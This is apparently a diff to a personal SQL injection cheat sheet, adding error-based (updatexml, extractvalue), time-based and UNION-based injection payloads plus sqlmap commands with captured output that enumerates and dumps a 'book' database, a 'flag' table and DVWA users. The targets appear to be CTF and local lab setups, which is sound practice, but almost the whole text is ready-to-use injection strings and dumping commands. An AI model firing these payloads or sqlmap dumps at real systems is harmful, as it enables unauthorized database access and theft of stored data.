@@ -53,7 +53,17 @@ cat=1+and+extractvalue(1,concat(':',(select+group_concat(column_name)+from+infor
 1' and extractvalue(1,concat(':',(select group_concat(table_name) from information_schema.tables))) -- #        // CHARACTER_SETS,COLLATIONS,COLLA
 1' and extractvalue(1,concat(':',(select group_concat(table_name) from information_schema.tables where table_schema = database()))) -- #        // ':book_list,flag'
 1' and extractvalue(1,concat(':',(select * from flag))) -- #
-
+--------------------------------
+test') ;-- #
+test' and updatexml(1, concat(0x7e, (user())), 0)); -- # 
+test' and updatexml(1, concat(0x7e, (version())), 0)); -- #
+test' and updatexml(1, concat(0x7e, (database())), 0)); -- #
+1' and updatexml(1, concat(0x7e, (SELECT concat(':',table_name) FROM  information_schema.tables limit 0,1)), 0)); -- #
+1' and updatexml(1, concat(0x7e, (SELECT concat(':',table_name) FROM  information_schema.tables where table_schema='member' limit 0,1)), 0)); -- #
+1' and updatexml(1, concat(0x7e, (SELECT concat(':',table_name) FROM information_schema.tables where table_schema='member' limit 1,1)), 0)); -- #
+1' and updatexml(1, concat(0x7e, (SELECT concat(':',table_name) FROM  information_schema.tables where table_schema='member' limit 2,1)), 0)); -- #
+1' and updatexml(1, concat(0x7e, (SELECT concat(':',table_name) FROM  information_schema.tables where table_schema='member' limit 3,1)), 0)); -- #
+1' and updatexml(1, concat(0x7e, (SELECT concat_ws(':',column_name) FROM  information_schema.columns where table_name='flag' limit 0,1)), 0)); -- #
 
 ========================================================================================================
 *** 2.UNION query SQL injection（可联合查询注入）***
@@ -75,6 +85,51 @@ sleep(5)
 case when true then sleep(1) else sleep(2) end
 case when (select pass from users where uname='test')='t' then sleep(1) else sleep(2) end
 
+-----------
+1' and sleep(3) -- #
+1' and case when true then sleep(1) else sleep(2) end -- #
+1' and case when true false sleep(1) else sleep(2) end -- #
+sqlmap -r req.txt -p bookID --schema --batch
+sqlmap -r req.txt -p bookID 
+    #########################
+    # [13:07:45] [INFO] the back-end DBMS is MySQL
+    # web server operating system: Linux Ubuntu
+    # web application technology: Nginx 1.10.3
+    # back-end DBMS: MySQL >= 5.0.12
+    ########################
+sqlmap -r req.txt -p bookID --dbs 
+    #########################
+    # [13:08:27] [INFO] fetching database names
+    # available databases [5]:
+    # [*] book
+    # [*] information_schema
+    # [*] mysql
+    # [*] performance_schema
+    # [*] sys
+    #########################
+sqlmap -r req.txt -p bookID -D book --tables 
+    #########################
+    #  [13:12:35] [INFO] fetching tables for database: 'book'
+    #  Database: book
+    #  [2 tables]
+    #  +-----------+
+    #  | book_list |
+    #  | flag      |
+    #  +-----------+
+    #########################
+sqlmap -r req.txt -p bookID -D book -T flag --columns
+    #########################
+    # [13:14:30] [INFO] fetching columns for table 'flag' in database 'book'
+    # Database: book
+    # Table: flag
+    # [1 column]
+    # +------------+--------------+
+    # | Column     | Type         |
+    # +------------+--------------+
+    # | flag_value | varchar(100) |
+    # +------------+--------------+
+    #########################
+sqlmap -r req.txt -p bookID -D book -T flag --dump 
 ========================================================================================================
 
 
@@ -125,3 +180,12 @@ python3 sqlmap.py \
     -u "http://localhost/vulnerabilities/sqli_blind/?id=&Submit=Submit" \
     --cookie="PHPSESSID=9fje9p9id62qvql64oti9i2vf2; security=low" \
     --dump -D dvwa -T users
+------
+
+sqlmap \
+    -u "http://localhost/vulnerabilities/sqli_blind/?id=&Submit=Submit" \
+------
+Four%' UNION ALL SELECT 1,2,3,4-- -
+Four%' UNION ALL SELECT 1,2,database(),4-- -
+Four%' UNION ALL SELECT 1,2,group_concat(table_name),4 from information_schema.tables-- -
+Four%' UNION ALL SELECT 1,2,group_concat(table_name),4 from information_schema.tables-- -
